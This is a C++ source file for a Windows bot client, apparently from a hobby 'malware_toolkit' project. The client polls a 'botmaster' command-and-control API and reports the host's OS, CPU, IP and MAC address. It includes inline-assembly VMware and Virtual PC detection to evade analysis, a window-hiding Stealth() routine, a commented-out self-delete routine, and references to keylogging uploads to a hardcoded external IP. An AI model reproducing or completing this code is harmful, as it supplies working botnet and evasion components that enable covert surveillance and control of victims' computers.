#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <winuser.h>
#include <Iphlpapi.h>
#include <Assert.h>
#include <strsafe.h>
#include <vector>
#include "UtilLib.h"
#include "HttpLib.h"
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable : 4996)


#define getSize(a) sizeof(a)/sizeof(a[0])

typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
typedef BOOL(WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);

bool IsInsideVMWare();
bool IsInsideVPC();
void Stealth();
char* getMAC();
char* GetOS();
bool selfDelete();
char* GetProcessor();
char* GetIP();

using namespace std;

//vector<string> keys = { "bot_id", "username", "cpu", "antivirus", "registry", "data", "mac_address" };
//vector<string> values = { "1234567890234560", "mark", "lol", "antivirus", "registry", "testytest", "33-33-33-33-33-33" };
string BOT_ID = "";
string MAC_ADDR = "";

int main(int argc, char *argv[])
{
	string url = "localhost";
	string api = "/malware_toolkit/api/test/";
	//vector<string> keys = { "username", "cpu", "antivirus", "registry", "data" };
	//vector<string> values = { "mark", "lol", "antivirus", "registry", "testytest" };
	vector<string> keys = vector<string>();
	vector<string> values = vector<string>();
	vector<vector<string>> requestQueue;
	char* query = NULL;
	char* response = NULL;
	vector<string> params;

	// in the real program these will be fetched with functions
	BOT_ID = "1";
	MAC_ADDR = "00-00-00-00-00-00";

	string data = "Data";

	//UPDATE LISTS
	//insertOrUpdate(keys, values, "mark", "says hi");
	//cout << keys[7] << endl;
	//cout << values[7] << endl;
	//insertOrUpdate(keys, values, "mark", "says bye");
	//cout << keys[7] << endl;
	//cout << values[7] << endl;

	//DUMP DATA AFTER POST
	//dumpData(keys, values);
	//cout << keys[0] << endl;
	//cout << values[0] << endl;
	//cout << keys[1] << endl;
	//cout << values[1] << endl;
	//cout << keys[2] << endl;
	//cout << values[2] << endl;

	//GENERAL POST REQUEST
	//USE THIS
	//sendP_Request(requestQueue, keys, values, "/database/api/handler/");

	//return 0;

	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "data" }, "/database/api/add_keylogging/");

	//return 0;

	//CONNECT IN STRUCTURE
	//GET for connect_in [mac_address, bot_id, os]

	keys.push_back("bot_id");
	values.push_back(BOT_ID);
	keys.push_back("mac_address");
	values.push_back(MAC_ADDR);

	int reqCounter = 5;
	while (reqCounter > 0){
		reqCounter--;
		cout << "are there any incompleted requests, do them now" << endl;
		Sleep(100);
		cout << "sending connect_in to botmaster..." << endl;
		response = sendG_Request(requestQueue, keys, values, { "mac_address", "bot_id" }, "/database/api/connect_in/");
		cout << "got the repsonse '" << response << "'" << endl;

		// compare the action respose from the botmaster with our list of available actions to do
		if (strcmp(response, "DetectVM")==0){
			cout << "Perfomring 'Detect VM' action" << endl;
			/*if(IsInsideVMWare())
				values.push_back("true");
			else
				values.push_back("false");
			keys.push_back("vm_status");*/
		}
		else if (strcmp(response, "DetectVPC")==0){
			cout << "Performing the 'Detect VPC' action" << endl;
			if (IsInsideVPC())
				values.push_back("true");
			else
				values.push_back("false");
			keys.push_back("vpc_status");
		}
		else if (strcmp(response, "GetOS")==0){
			cout << "Performing the 'Get OS' action" << endl;
			char *os = GetOS();
			keys.push_back("os");
			values.push_back(os);
		}
		else if (strcmp(response, "GetCPU") == 0){
			cout << "Performing the 'Get CPU' action" << endl;
			char *proc = GetProcessor();
			cout << "proc" << proc << endl;
			keys.push_back("cpu");
			values.push_back(proc);
		}
		else if (strcmp(response, "GetIP") == 0){
			cout << "Performing the 'Get IP' action" << endl;
			char *ip = GetIP();
			keys.push_back("ip_address");
			values.push_back(ip);
		}
		else{
			cout << "Not sure what to do" << endl;
		}

		Sleep(200);
	}

	sendP_Request(requestQueue, keys, values, "/database/api/handler/");
	dumpData(keys, values);


	delete[] response;

	system("pause");
	return 0;

	//SPECIFIC POST CASES TO ONE API AT A TIME
	//NOT REALLY IN USE ANYMORE
	//Post for add_os [mac_address, bot_id, os]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "os" }, "/database/api/add_os/");

	//Post for add_cpu [mac_address, bot_id, cpu]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "cpu" }, "/database/api/add_cpu/");

	//Post for add_antivirus [mac_address, bot_id, antivirus]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "antivirus" }, "/database/api/add_antivirus/");

	//Post for add_registry [mac_address, bot_id, registry]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "registry" }, "/database/api/add_registry/");

	//Post for add_antivirus [mac_address, bot_id, antivirus]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "antivirus" }, "/database/api/add_antivirus/");

	//Post for add_username [mac_address, bot_id, username]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "username" }, "/database/api/add_username/");

	return 0;

	//this one needs work
	//Post for add_keylogging [mac_address, bot_id, keylogging]
	//char* postRes = httpPostRequest("70.61.16.8", "/database/api/add_keylogging/", 50000, query);
	//cout << postRes << endl;
	//delete[] postRes;

	//delete[] query;

	//system("pause");
	return 0;
}

bool IsInsideVMWare()
{
	bool rc = true;
	char vm[] = "VMXh";
	char port[] = "VX";

	__try{
		__asm{
			push edx
				push ecx
				push ecx
				push ebx
				push ebx
				mov eax, 'VMXh'
				mov ebx, 0  //any value but not the MAGIC VALUE
				mov ecx, 10 // get VMWare versiond
				mov edx, 'VX'
				in eax, dx  //read port
				cmp ebx, 'VMXh' // is it a replay from VMWare
				setz rc
				pop ebx
				pop ecx
				pop edx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		rc = false;
	}

	return rc;
}

bool IsInsideVPC()
{
	bool rc = false;
	char vm[] = "VMXh";
	char port[] = "VX";

	__try{
		__asm{
			push ebx
				mov ebx, 0
				mov eax, 1
				__emit 0Fh
				__emit 3Fh
				__emit 07h
				__emit 0Bh
				test ebx, ebx
				setz[rc]
				pop ebx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	return rc;
}

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

char* getMAC(){
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(AdapterInfo);
	char *mac_addr = (char*)malloc(17);

	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
	}
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		do {
			sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1],
				pAdapterInfo->Address[2], pAdapterInfo->Address[3],
				pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
			return mac_addr;
			pAdapterInfo = pAdapterInfo->Next;
		} while (pAdapterInfo);
	}
	free(AdapterInfo);
}
//self delete wont build
/*bool selfDelete()
{
TCHAR szFile[1024], szCmd[1024];

if ((GetModuleFileName(0, szFile, MAX_PATH) != 0) &&
(GetShortPathName(szFile, szFile, MAX_PATH) != 0))
{
lstrcpy(szCmd, "/c del ");
lstrcat(szCmd, szFile);
lstrcat(szCmd, " >> NUL");

if ((GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0) &&
((int)ShellExecute(0, 0, szFile, szCmd, 0, SW_HIDE)>32))
return TRUE;
}

return FALSE;
}
*/

char* GetOS()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);

	if (!bOsVersionInfoEx){
#ifdef __APPLE__
		return "Mac";
#elif __linux__
		return "Linux";
#elif __unix__
		return "Unix";
#endif
		return "Other";
	}

	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);

	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion == 6){
			if (osvi.dwMinorVersion == 0){
				if (osvi.wProductType == VER_NT_WORKSTATION)
					return "Windows Vista";
				else return "Windows Server 2008";
			}
			if (osvi.dwMinorVersion == 1 || osvi.dwMinorVersion == 2){
				if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 1)
					return "Windows 7";
				else
					if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 2)
						return "Windows 8";
					else return "Windows Server 2008 R2";
			}
		}
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2){
			if (osvi.wSuiteMask & VER_SUITE_WH_SERVER)
				return "Windows Home Server";
			else if (osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "Windows XP Professional";
			else return "Windows Server 2003";
		}

		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
			return "Windows XP";
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
			return "Windows 2000";
		return "Windows";
	}
	else
		return "Other";
}

char* GetProcessor()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);

	if (!bOsVersionInfoEx) return "Not Determined";

	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);

	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion >= 6){
			if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "64-bit";
			else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
				return "32-bit";
		}
		else
			return "32-bit";
	}
	return "Not Determined";
}

char* GetIP()
{
	WSAData wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	HOSTENT* Host;
	char hostname[128] = { 0 };
	char* IPv4 = new char[128];
	gethostname(hostname, 128);
	Host = gethostbyname(hostname);
	IPv4 = inet_ntoa(*(in_addr*)Host->h_addr_list[0]);
	WSACleanup();
	return IPv4;

}